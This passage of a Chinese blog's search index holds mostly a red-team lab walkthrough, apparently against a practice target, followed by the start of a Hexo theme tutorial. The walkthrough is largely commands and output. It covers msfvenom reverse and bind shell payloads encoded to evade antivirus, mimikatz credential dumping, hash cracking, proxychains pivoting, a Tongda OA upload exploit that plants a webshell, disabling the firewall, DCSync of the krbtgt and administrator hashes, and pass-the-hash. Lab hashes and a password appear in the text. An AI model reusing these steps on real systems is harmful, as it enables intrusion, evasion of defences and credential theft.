都会被查杀，所以要做免杀处理。</p>\n<h2 id=\"2-12-msf-shellcode-绕过-windows-defender-查杀\"><a href=\"#2-12-msf-shellcode-绕过-windows-defender-查杀\" class=\"headerlink\" title=\"2.12. msf shellcode 绕过 windows defender 查杀\"></a>2.12. msf shellcode 绕过 windows defender 查杀</h2><h3 id=\"2-12-1Msf生成payload\"><a href=\"#2-12-1Msf生成payload\" class=\"headerlink\" title=\"2.12.1Msf生成payload\"></a>2.12.1Msf生成payload</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.133 LPORT=2333 -e x86/shikata_ga_nai -i 25 -f csharp -o payload.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"KQh295rcjlduAgxH2M2AdFFTd0xqgN-edsMFkdu9Dn8.png\" alt=\"image\"></p>\n<h3 id=\"2-12-3msf-监听\"><a href=\"#2-12-3msf-监听\" class=\"headerlink\" title=\"2.12.3msf 监听\"></a>2.12.3msf 监听</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 192.168.8.133</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 2333</span><br><span class=\"line\">run -j</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-12-4-得到-session\"><a href=\"#2-12-4-得到-session\" class=\"headerlink\" title=\"2.12.4. 得到 session\"></a>2.12.4. 得到 session</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\Tasks\\PrintSpoofer1.exe -i -c <span class=\"string\">&quot;C:\\Windows\\Tasks\\msf.exe&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"C3T6rmDiUzVIQV4JIu-v0TdtTJZoUJ8-i4O4QT_anC8.png\" alt=\"image\"></p>\n<p> 迁移进程后 做后渗透处理</p>\n<h2 id=\"2-13-收集-hash-明文\"><a href=\"#2-13-收集-hash-明文\" class=\"headerlink\" title=\"2.13. 收集 hash 明文\"></a>2.13. 收集 hash 明文</h2><p>在 msf load mimikatz 无法获取明文，hash 允许获取</p>\n<p><img src=\"l2hZcYa-gA-7VIkULKO1VeR_wTgZmra_TZkmRlTk0rI.png\" alt=\"image\"></p>\n<p>下面简单的介绍一下神器的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">cls-----------------------------清屏</span><br><span class=\"line\"><span class=\"built_in\">exit</span>----------------------------退出</span><br><span class=\"line\">version------------查看mimikatz的版本</span><br><span class=\"line\">system::user-----查看当前登录的系统用户</span><br><span class=\"line\">system::computer-------查看计算机名称</span><br><span class=\"line\">process::list------------------列出进程</span><br><span class=\"line\">process::<span class=\"built_in\">suspend</span> 进程名称 -----暂停进程</span><br><span class=\"line\">process::stop 进程名称---------结束进程</span><br><span class=\"line\">process::modules --列出系统的核心模块及所在位置</span><br><span class=\"line\">service::list---------------列出系统的服务</span><br><span class=\"line\">service::remove-----------移除系统的服务</span><br><span class=\"line\">service::start stop 服务名称--启动或停止服务</span><br><span class=\"line\">privilege::list---------------列出权限列表</span><br><span class=\"line\">privilege::<span class=\"built_in\">enable</span>--------激活一个或多个权限</span><br><span class=\"line\">privilege::debug-----------------提升权限</span><br><span class=\"line\">nogpo::cmd------------打开系统的cmd.exe</span><br><span class=\"line\">nogpo::regedit -----------打开系统的注册表</span><br><span class=\"line\">nogpo::taskmgr-------------打开任务管理器</span><br><span class=\"line\">ts::sessions-----------------显示当前的会话</span><br><span class=\"line\">ts::processes------显示进程和对应的pid情况等</span><br><span class=\"line\">sekurlsa::wdigest-----获取本地用户信息及密码</span><br><span class=\"line\">sekurlsa::tspkg------获取tspkg用户信息及密码</span><br><span class=\"line\">sekurlsa::logonPasswords--获登陆用户信息及密码</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-14-ntml-破解\"><a href=\"#2-14-ntml-破解\" class=\"headerlink\" title=\"2.14. ntml 破解\"></a>2.14. ntml 破解</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator ntml e7114141b0337bdce1aedf5594706205 </span><br><span class=\"line\">在 somd5 得到明文</span><br></pre></td></tr></table></figure>\n<p><img src=\"fcVwEo2no7DWKnGdR1hNR9hIOIdcGkL5s0sOuSD0WMM.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashat 字典破解 ntml</span><br><span class=\"line\">hashcat -a 0 -m 1000 hash.txt big.txt –show</span><br><span class=\"line\">-a 0 字典模式</span><br><span class=\"line\">-m 是类型</span><br><span class=\"line\">hash.txt 是 ntml</span><br><span class=\"line\">rockyou 是字典</span><br></pre></td></tr></table></figure>\n<p><img src=\"DGEHzQdXPGh6dj1ic_b1vgjThiMxxfoy8Viuxv8Pikw.png\" alt=\"image\"></p>\n<h2 id=\"2-16-登录远程桌面\"><a href=\"#2-16-登录远程桌面\" class=\"headerlink\" title=\"2.16. 登录远程桌面\"></a>2.16. 登录远程桌面</h2><p><img src=\"AfTnpPk2XxUHR7RrdhC0762eNcGtFc3P94rR01AsrrQ.png\" alt=\"image\"></p>\n<p>在目标将下面的这个打勾去掉即可</p>\n<p><img src=\"Hcteh5fg4UlrzUzTSPFFFBTbweal9-HXP0wTwxN39Bc.png\" alt=\"image\"></p>\n<p>连接成功</p>\n<p><img src=\"fPih-szITk13TrvcPf1dpZwp7o6NFITgWqTWgsWV1OE.png\" alt=\"image\"></p>\n<h2 id=\"2-17内网渗透\"><a href=\"#2-17内网渗透\" class=\"headerlink\" title=\"2.17内网渗透\"></a>2.17内网渗透</h2><h2 id=\"2-18-WEB服务器信息收集\"><a href=\"#2-18-WEB服务器信息收集\" class=\"headerlink\" title=\"2.18.WEB服务器信息收集\"></a>2.18.WEB服务器信息收集</h2><p>IP 192.168.0.114 10.10.1.131</p>\n<p>账号信息 Administrator !@#QWE123 </p>\n<p>目前渗透的进度</p>\n<p><img src=\"3EjnoXW6S1IwfN2-0S46PxJhQMp2ajXZ-o7gsHHEbpk.png\" alt=\"image\"></p>\n<h2 id=\"2-19跨网段横行渗透\"><a href=\"#2-19跨网段横行渗透\" class=\"headerlink\" title=\"2.19跨网段横行渗透\"></a>2.19跨网段横行渗透</h2><h3 id=\"2-19-1内网-ping-协议发现主机\"><a href=\"#2-19-1内网-ping-协议发现主机\" class=\"headerlink\" title=\"2.19.1内网 ping 协议发现主机\"></a>2.19.1内网 ping 协议发现主机</h3><p>对 10.10.1.0&#x2F;24 进行横向渗透首先获取这个段下的 pc</p>\n<p>查询 10.10.1.0&#x2F;24 存活的 IP</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> /l %i <span class=\"keyword\">in</span> (1,1,255) <span class=\"keyword\">do</span> @ ping 10.10.1.%i    -w   1 -n 1 | find /i <span class=\"string\">&quot;ttl=&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"n2T1zFR0cCBco8nQY-Prgk8lp1OII65WguSedTwsmDw.png\" alt=\"image\"></p>\n<h3 id=\"2-19-2msf-arp-发现主机\"><a href=\"#2-19-2msf-arp-发现主机\" class=\"headerlink\" title=\"2.19.2msf arp 发现主机\"></a>2.19.2msf arp 发现主机</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run arp_scanner -r 10.10.1.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"R1PMPyvghYk1ecx1ZF3ThLHsZkdFiHIBsorR1MMyJdI.png\" alt=\"image\"></p>\n<p>在实际的内网渗透中，我们可以直接添加到 0.0.0.0&#x2F;24的路由，这样，只要该被控主机可达的地址就都可达！</p>\n<h3 id=\"2-19-3msf-socks5-proxychains-穿透内网\"><a href=\"#2-19-3msf-socks5-proxychains-穿透内网\" class=\"headerlink\" title=\"2.19.3msf socks5 proxychains 穿透内网\"></a>2.19.3msf socks5 proxychains 穿透内网</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msf 添加路由 </span><br><span class=\"line\">run autoroute -s 10.10.1.0/24 </span><br><span class=\"line\">background</span><br><span class=\"line\">use auxiliary/server/socks_proxy </span><br><span class=\"line\"><span class=\"built_in\">set</span> srvport 3333 </span><br><span class=\"line\">run </span><br></pre></td></tr></table></figure>\n<p><img src=\"YeLJ3H1BZ6e9NvUM8QNSFc1PbY2Ifx0AaF4Ctq5RmRU.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"EeWAaOP5OvJZfwJ8g_gx4RWL_fzEVvouhdjedm9MmbY.png\" alt=\"image\"></p>\n<h3 id=\"2-19-4proxychains-nmap-扫描内网\"><a href=\"#2-19-4proxychains-nmap-扫描内网\" class=\"headerlink\" title=\"2.19.4proxychains nmap 扫描内网\"></a>2.19.4proxychains nmap 扫描内网</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -sT -Pn 10.10.1.130 -p80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389 –open</span><br></pre></td></tr></table></figure>\n<p><img src=\"QGCo_kAO_gBVmlYLTVux0QEYyYPn3ZPngH4s8wf9pHQ.png\" alt=\"image\"></p>\n<p>目前只能访问 80 端口 估计是做了端口访问控制</p>\n<h3 id=\"2-19-5proxychains-调用火狐访问内网\"><a href=\"#2-19-5proxychains-调用火狐访问内网\" class=\"headerlink\" title=\"2.19.5proxychains 调用火狐访问内网\"></a>2.19.5proxychains 调用火狐访问内网</h3><p>proxychains firefox 10.10.1.130 -p80</p>\n<p><img src=\"PEve1naRmvnnpgZHDjszy_w4PMXHVyQ_ToUsYkl-hG8.png\" alt=\"image\"></p>\n<h3 id=\"2-19-6通达上传漏洞-GETSHEL\"><a href=\"#2-19-6通达上传漏洞-GETSHEL\" class=\"headerlink\" title=\"2.19.6通达上传漏洞 GETSHEL\"></a>2.19.6通达上传漏洞 GETSHEL</h3><p>访问端口发现是通达 os 网络智能办公系统</p>\n<p><img src=\"vmFMnqAphHomaavlKs0LW-O2mLg0oJtGAPgZUzw2zLE.png\" alt=\"image\"></p>\n<p> </p>\n<p>放到脚本中</p>\n<p><img src=\"YTojjRBOo1zta2fVNXMSklQvB2nQnoiIMt3YMS1ribU.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains python tongda-exp.py -H http://10.10.1.130</span><br></pre></td></tr></table></figure>\n<p>使用python2运行，拿到一个cmdshell</p>\n<p><img src=\"J4Y6Y0fbbVVTeHzuUz4d_nJm6WqRqLYj8VBNMbLxCdk.png\" alt=\"image\"></p>\n<p>生成小马到系统中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains python tongda-exp.py -H http://10.10.1.130 -file-shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"EWB23x2GrRc5ierhQwi1R7qeN71b-M-ASCfZ6AaaaPQ.png\" alt=\"image\"></p>\n<h3 id=\"2-19-7-配置中国蚁剑代理内网连接-shell\"><a href=\"#2-19-7-配置中国蚁剑代理内网连接-shell\" class=\"headerlink\" title=\"2.19.7. 配置中国蚁剑代理内网连接 shell\"></a>2.19.7. 配置中国蚁剑代理内网连接 shell</h3><p>连接地址：<a href=\"http://10.10.1.130/ispirit/interface/404.php\">http://10.10.1.130/ispirit/interface/404.php</a></p>\n<p>设置代理</p>\n<p><img src=\"8jsoh1UgImnDHAXWe1a_HtuWCI9DbkkWQzum30od4JQ.png\" alt=\"image\"></p>\n<p><img src=\"Eyi4pmCum0gzehBWJ-ycn9vi6iKHS9SCnWH3Ef2MdcM.png\" alt=\"image\"></p>\n<h3 id=\"2-19-8收集-oa-服务器信息\"><a href=\"#2-19-8收集-oa-服务器信息\" class=\"headerlink\" title=\"2.19.8收集 oa 服务器信息\"></a>2.19.8收集 oa 服务器信息</h3><p>收集整理有用的信息 操作的时候小心，尽量避免打草惊蛇。</p>\n<p>当前是系统权限 system</p>\n<p><img src=\"ls0gERVavMAT58jr2Da4DDH0hyXfY8_z6cbHXNajj68.png\" alt=\"image\"></p>\n<p>在运行的服务</p>\n<p><img src=\"qxe6oCSNTnN6hN-sWy2eO2Ald3jTKzu0A3lcPW4S6PM.png\" alt=\"image\"></p>\n<p><img src=\"f_CqD523ENpwf-00DJYJOqUmPGDjXpP99PiK9jd6Vn4.png\" alt=\"image\"></p>\n<p>进程列表</p>\n<p><img src=\"btfk28wwe-aYEvTqttCbcKC2uc4l5z4DfX6mPjJnsDA.png\" alt=\"image\"></p>\n<p><img src=\"DMBaIf4vESEiH16QqQdQwfLzO87gTsfaW9KNoi4k-ek.png\" alt=\"image\"></p>\n<p>端口连接信息</p>\n<p><img src=\"98YFy41nAr7FEVZRujlHJ0-iOPdwEvan8K9XsiwqRgk.png\" alt=\"image\"></p>\n<p>网卡信息</p>\n<p><img src=\"klbfxthINJ6gzws9JlLhQE188XRVahPHRXo83rIl5p8.png\" alt=\"image\"></p>\n<p>信息整理 </p>\n<p>oa 服务器存在两个 IP 分别是 10.10.1.130   10.10.10.166 </p>\n<p>防护软件 内置系统防火墙 Windows Firewall 360 安全卫士 360</p>\n<table>\n<thead>\n<tr>\n<th>协议</th>\n<th>本地地址</th>\n<th>外部地址</th>\n<th>状态</th>\n<th>PID</th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>TCP</td>\n<td>0.0.0.0:80</td>\n<td>0.0.0.0:0</td>\n<td>LISTENING</td>\n<td><br></td>\n<td>2308</td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:110<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br> <br></td>\n<td><br>1704<br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:135<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br> <br></td>\n<td><br>620<br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:445<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br> <br></td>\n<td><br>4<br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:1188<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br> <br></td>\n<td><br>3844<br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:3336<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br> <br></td>\n<td><br>1372<br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:5985<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br> <br></td>\n<td><br>4<br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:8750<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br> <br></td>\n<td><br>2308<br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:47001<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br> <br></td>\n<td><br>4<br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:49152<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br>436<br></td>\n<td><br> <br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:49153<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br>788<br></td>\n<td><br> <br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:49154<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br>536<br></td>\n<td><br> <br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:49155<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br>824<br></td>\n<td><br> <br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:61195<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br>528<br></td>\n<td><br> <br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:61436<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br>536<br></td>\n<td><br> <br></td>\n</tr>\n<tr>\n<td><br>TCP<br></td>\n<td><br>0.0.0.0:61454<br></td>\n<td><br>0.0.0.0:0<br></td>\n<td><br>LISTENING<br></td>\n<td><br>1284<br></td>\n<td><br> <br></td>\n</tr>\n</tbody></table>\n<p> </p>\n<p> </p>\n<h3 id=\"2-19-9命令行关闭-Windows-Firewall\"><a href=\"#2-19-9命令行关闭-Windows-Firewall\" class=\"headerlink\" title=\"2.19.9命令行关闭 Windows Firewall\"></a>2.19.9命令行关闭 Windows Firewall</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">NetSh Advfirewall <span class=\"built_in\">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>\n<p><img src=\"AUuHsaVuIL9fkVOOol3TDpvm0VW6tUFUY14MwbkaAIY.png\" alt=\"image\"></p>\n<p><img src=\"9qAWpZfYX2_sranYBBv94mVjIxNpO7TexQqeGGjKqOE.png\" alt=\"image\"></p>\n<p>现在可以访问除 80 以外的端口，可以正向连接 oa 服务器 再进行其他操作深入的操作。</p>\n<h3 id=\"2-19-10免杀过-360-全家桶\"><a href=\"#2-19-10免杀过-360-全家桶\" class=\"headerlink\" title=\"2.19.10免杀过 360 全家桶\"></a>2.19.10免杀过 360 全家桶</h3><p>生成正向连接 shellcode</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/bind_tcp LPORT=9872 -e x86/shikata_ga_nai -i 25 -f csharp -o payload2.txt</span><br></pre></td></tr></table></figure>\n<p>再用工具免杀 上传到 oa 服务器上执行 再查看进行是否被 360 查</p>\n<p><img src=\"fQC3u2M7C86iBscv9WS5nNNiLt45aq92NfCrjACjiTc.png\" alt=\"image\"></p>\n<h3 id=\"2-19-11msf-正向链接oa\"><a href=\"#2-19-11msf-正向链接oa\" class=\"headerlink\" title=\"2.19.11msf 正向链接oa\"></a>2.19.11msf 正向链接oa</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/bind_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhost 10.10.1.130</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 9872</span><br><span class=\"line\">run -j</span><br></pre></td></tr></table></figure>\n<p><img src=\"Xi6JTNVChjOIbig9wN5ofa1BRONDcOTfeFvC2Dwh9F8.png\" alt=\"image\"></p>\n<p><img src=\"kRpdsMreRvPF_xeMt_1BOwAS_fdQCaWjCswQGHb5xQU.png\" alt=\"image\"></p>\n<p>得到 oa 的 seesion 接下来就是收集服务器信息了。 </p>\n<p>网卡信息</p>\n<p><img src=\"N48BMOIMgp4KK5LLJBs3ll-TWO-71OoRv-JRx1QE2Os.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashdump</span><br></pre></td></tr></table></figure>\n<p><img src=\"VnfnTsFacdAEDPVFslYEyEnLMcB7l9-lf93aEVSncKg.png\" alt=\"image\"></p>\n<p><img src=\"oHcVigaPfZnsYT1QXiHgK0DDyavsOCRB8gm5sszppyQ.png\" alt=\"image\"></p>\n<p>把信息收集完毕接下来就是进行内网域控的渗透。</p>\n<h2 id=\"2-20-内网域渗透\"><a href=\"#2-20-内网域渗透\" class=\"headerlink\" title=\"2.20.内网域渗透\"></a>2.20.内网域渗透</h2><p>目前渗透进度 web 服务器到 oa 办公系统服务器下一步进行域控的渗透。</p>\n<p>目前 oa 办公的权限是 system 权限较高</p>\n<p><img src=\"-Sp4lo39eOQ6hjGBVfRZiOUxND2t524PH78bBo3Anso.png\" alt=\"image\"></p>\n<h3 id=\"2-20-1-定位域控\"><a href=\"#2-20-1-定位域控\" class=\"headerlink\" title=\"2.20.1. 定位域控\"></a>2.20.1. 定位域控</h3><p>在使用命令的期间发现 session 多次失败，可以确定 web 服务器有些防护软件会对操作进行拦截</p>\n<p><img src=\"BAqGVWeMLT-0IzBAkELVbJBLJTuTrt9jMGvOzzymNXA.png\" alt=\"image\"></p>\n<p>run post&#x2F;windows&#x2F;gather&#x2F;enum_domain</p>\n<p>发现蓝屏了</p>\n<p><img src=\"dMxGZPX_rdJ3KSDltud0p5DcBHj8j7Z8FRbZGqfXKsc.png\" alt=\"image\"></p>\n<p>再测试一次成功了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"YCwk0NDopvY_laUcB105BJ9L-OtXw_teI5-OixFRcQE.png\" alt=\"image\"></p>\n<p>（发现进程迁移之后，执行run post的命令会离线或者蓝屏）</p>\n<p>登录的用户</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure>\n<p><img src=\"-cfgFnb_AS5JFjW0Or-80KtsxTcY2YPZJ97iUBM9ARs.png\" alt=\"image\"></p>\n<p>组的信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post/windows/gather/enum_ad_groups</span><br><span class=\"line\">net group <span class=\"string\">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"PrJgGvLoHZhUZ0dyEsrzHSu9v9niU2tOGMjievb93Uc.png\" alt=\"image\"></p>\n<p>进程存在域管理员</p>\n<p><img src=\"xMrnSy84nUJu0SAZGcq7Jry30tTETXABuXn1AKUI8Fo.png\" alt=\"image\"></p>\n<h3 id=\"2-20-2跨网段探测-DC-端口\"><a href=\"#2-20-2跨网段探测-DC-端口\" class=\"headerlink\" title=\"2.20.2跨网段探测 DC 端口\"></a>2.20.2跨网段探测 DC 端口</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"h7qC_QiC8fj6UPWhYAQdJYIICOpm9sVtGpWHpjOcCZg.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -sT -Pn 10.10.10.165 -p80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,88,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389 –open</span><br></pre></td></tr></table></figure>\n<p><img src=\"e0LxqpNJ_xyClGheYI3WFiu0qfXz7I4b9ZFy-jqxQNY.png\" alt=\"image\"></p>\n<p>3389 端口是开放的 445 也是开放的</p>\n<p> </p>\n<h3 id=\"2-21-kiwi域管ntml\"><a href=\"#2-21-kiwi域管ntml\" class=\"headerlink\" title=\"2.21.kiwi域管ntml\"></a>2.21.kiwi域管ntml</h3><p>获取域控的权限</p>\n<p>因为系统权限是看不到域管理员的ntlm，所以需要迁移进程到域用户启动的进程下</p>\n<p>steal_token 4548</p>\n<p><img src=\"IhQ3iAqx0xT3EPEyHXY8HQefjJXc-SWZtR5KvPuF4Ic.png\" alt=\"image\"></p>\n<p>查看域控管理员的hash</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; dcsync_ntlm administrator</span><br><span class=\"line\">[+] Account   : administrator</span><br><span class=\"line\">[+] NTLM Hash : f0656e74c0c8b23b49dc65c630a500d0</span><br><span class=\"line\">[+] LM Hash   : 1d0291463377c361ea7e94f36f8a7ab2</span><br><span class=\"line\">[+] SID       : S-1-5-21-4052809752-717748265-227546684-500</span><br><span class=\"line\">[+] RID       : 500</span><br></pre></td></tr></table></figure>\n<p><img src=\"HdUiTJ-Dh-fY2AawzIyEdOIOAluytm0_n_33q9s8xQI.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dcsync_ntlm krbtgt  (krbtgt这个用户做黄金票据的时候用到)</span><br><span class=\"line\">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class=\"line\">[+] Account   : krbtgt</span><br><span class=\"line\">[+] NTLM Hash : 67446f76100703cc0866cb7167cca084</span><br><span class=\"line\">[+] LM Hash   : c7192cc0c2c01aee95bc9a98664ed15b</span><br><span class=\"line\">[+] SID       : S-1-5-21-4052809752-717748265-227546684-502</span><br><span class=\"line\">[+] RID       : 502</span><br></pre></td></tr></table></figure>\n<p><img src=\"_tdS-7mw1wI-pJ-UL4dRfA5Osv91cWxGYcAVkl_6AwQ.png\" alt=\"image\"></p>\n<p>拿到ntlm可以使用hash来进行登录</p>\n<p> </p>\n<p>使用hash登录，445端口是开放的，所以可以使用smb进行尝试登录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/windows/smb/psexec</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhosts 10.10.10.165</span><br><span class=\"line\"><span class=\"built_in\">set</span> smbpass f0656e74c0c8b23b49dc65c630a500d0</span><br><span class=\"line\"><span class=\"built_in\">set</span> smbuser administrator</span><br></pre></td></tr></table></figure>\n<p><img src=\"be17US6UzGAQ8jvKZjuvzeSGMtYIS9kzBkgon0yOKfI.png\" alt=\"image\"></p>\n<p>制作pth登录，因为自带的mimikatz没有pth，所以我们上传一个到服务器在命令行下执行</p>\n<p>生成key.snk</p>\n<p> </p>\n<h2 id=\"2-22Pth攻击\"><a href=\"#2-22Pth攻击\" class=\"headerlink\" title=\"2.22Pth攻击\"></a>2.22Pth攻击</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::pth /user:administrator /domain:attack /ntlm:f0656e74c0c8b23b49dc65c630a500d0</span><br><span class=\"line\">使用mimikatz先获取<span class=\"built_in\">hash</span>:</span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n<p><img src=\"6W-L3HCwPbyl8CDzea0g_dX_AbQHAIXVvnX-9kqTB4Q.png\" alt=\"image\"></p>\n<p>得到hash后</p>\n<p><img src=\"A2o0GokxepUn3kowq7WGdM1Z15UHWUF_TiA2VMLG2dw.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>\n<p>可以看到NTML hash已经对workgroup使用，这样的话访问远程主机或服务，就不用提供明文密码</p>\n<p><img src=\"skRae733cRn_MTBQ477_eKEW6ybXpdoln5uLgxE2GVo.png\" alt=\"image\"></p>\n<p>pass the hash成功~</p>\n<p> </p>\n<p> </p>\n<h2 id=\"2-23ntml登录破解\"><a href=\"#2-23ntml登录破解\" class=\"headerlink\" title=\"2.23ntml登录破解\"></a>2.23ntml登录破解</h2><p><a href=\"https://www.cmd5.com/\">https://www.cmd5.com/</a></p>\n<p><img src=\"Bk3_2Q8Ix78vfD29Kp21S5naClZzH4zZzg2jGOxQPuE.png\" alt=\"image\"></p>\n<p><img src=\"zQZ6ONeM_4iKxR5AZaJN-FG1fWgl-AJg4HO-qj1Ym24.png\" alt=\"image\"></p>\n<p><img src=\"b1QBXTVg91JmRXAVrrFQV1nxZF7UPXv3G-Ne8VEABwo.png\" alt=\"image\"></p>\n<p><img src=\"1xP4fTiuONFparQf8oH1loTgQDMJTArNbPII7gugVVA.png\" alt=\"image\"></p>\n","categories":["打靶日记（moon）"],"tags":["红队","域渗透","打点"]},{"title":"搭建Hexo博客进阶","url":"/2020/02/29/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/","content":"<h1 id=\"搭建Hexo博客进阶\"><a href=\"#搭建Hexo博客进阶\" class=\"headerlink\" title=\"搭建Hexo博客进阶\"></a>搭建Hexo博客进阶</h1><h2 id=\"更换模板\"><a href=\"#更换模板\" class=\"headerlink\" title=\"更换模板\"></a>更换模板</h2><p>到themes目录下，下载自己喜欢主题模板</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/probberechts/hexo-theme-cactus.git</span><br></pre></td></tr></table></figure>\n<p>在项目的_config.yml文件中进行更换主题</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">theme: hexo-theme-cactus</span><br></pre></td></tr></table></figure>\n<p>在项目目录下，打开git bash，输入以下命令，清除缓存，生成静态文件，查看效果</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo s  <span 